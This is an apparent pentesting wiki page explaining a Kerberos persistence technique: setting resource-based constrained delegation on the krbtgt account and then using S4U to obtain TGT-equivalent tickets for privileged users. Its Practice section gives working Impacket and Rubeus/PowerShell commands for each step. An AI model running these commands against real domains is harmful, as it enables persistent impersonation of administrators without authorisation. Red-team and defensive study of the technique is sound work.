# Delegation to KRBTGT

## Theory

The idea behind this technique is to configure [resource-based constrained delegation](../movement/kerberos/delegations/rbcd.md) on the `krbtgt` account to generate TGTs on-demand as a persistence technique. The requirements for the technique are to have enough privileges (i.e. domain admin rights) to edit the `krbtgt` account's "rbcd" attribute (i.e. `ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity`) and to control an account that has an SPN ([or create one](../movement/domain-settings/machineaccountquota.md)).

Once the delegation is configured, an attacker can later on obtain a service ticket for the krbtgt on behalf of any user. Since a TGT is just a service ticket for the `KRBTGT` service, it means the attacker has a persistence technique allowing him to obtain a TGT for almost any user in the domain. The only limitations are the "Protected Users" group, or the "Account is sensitive and cannot be delegated" parameter. Those settings can protect users from delegation and will prevent attackers from obtaining a ticket that looks like a TGT on their behalf through a delegation trick.

An example of the abuse goes as follows :

1. Configure RBCD delegation on the `krbtgt` account to allow a controlled account to delegate to it. The controlled account should have at least one SPN (i.e. ServicePrincipalName) for the delegation to work ([not mandatory though](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)). This controlled account will be called "ControlledAccountWithSPN".
2. Perform a full [S4U](../movement/kerberos/delegations/) attack to obtain a Service Ticket for the `krbtgt` service, on behalf of another privileged user. Let's call this chosen user "TargetedAccount". The ticket obtained through this process is for the `KRBTGT` service, which basically means the ticket can be used as a TGT for the TargetedAccount.
3. [Pass-the-ticket](../movement/kerberos/ptt.md) to use the TGT, act as the target -privileged- user, and authenticate to remote resources.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
Every step of this attack can be achieved using one of the following scripts from Impacket : rbcd.py and getST.py.

{% code overflow="wrap" %}
```bash
# Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgt
rbcd.py -delegate-from 'ControlledAccountWithSPN' -delegate-to 'krbtgt' -dc-ip $dcIp -action write 'DOMAIN'/'PrivilegiedAccount':'StrongPassword'

# Step 2 : S4U attack for TargetedAccount to ControlledAccountWithSPN
getST.py -spn "KRBTGT" -impersonate "TargetedAccount" -dc-ip $dcIp 'DOMAIN'/'ControlledAccountWithSPN':'PasswordOfControlledAccountWithSPN'

# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (which is a TGT).
KRB5CCNAME='TargetedAccount@krbtgt_DOMAIN@DOMAIN.ccache' getST.py -spn 'cifs/target' -k -no-pass 'DOMAIN'/'TargetedAccount'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
Every step of this attack can be achieved using Rubeus and the Set-ADUser command.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgt
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount ControlledAccountWithSPN

# Step 2 : Full S4U for TargetedAccount to krbtgt using ControlledAccountWithSPN
<strong>Rubeus.exe s4u /nowrap /impersonateuser:"TargetedAccount" /msdsspn:"krbtgt" /domain:"DOMAIN" /user:"ControlledAccountWithSPN" /rc4:$NThash
</strong>
# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (printed in a base64 blob thanks to the /nowrap flag), and inject it in memory using /ptt in order to use the resulting ticket for authentication to remote resources
Rubeus.exe asktgs /service:"cifs/target" /ticket:"base64ticket...." /ptt</code></pre>
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence" %}

{% embed url="https://skyblue.team/posts/delegate-krbtgt/" %}

{% content-ref url="../movement/kerberos/delegations/rbcd.md" %}
[rbcd.md](../movement/kerberos/delegations/rbcd.md)
{% endcontent-ref %}
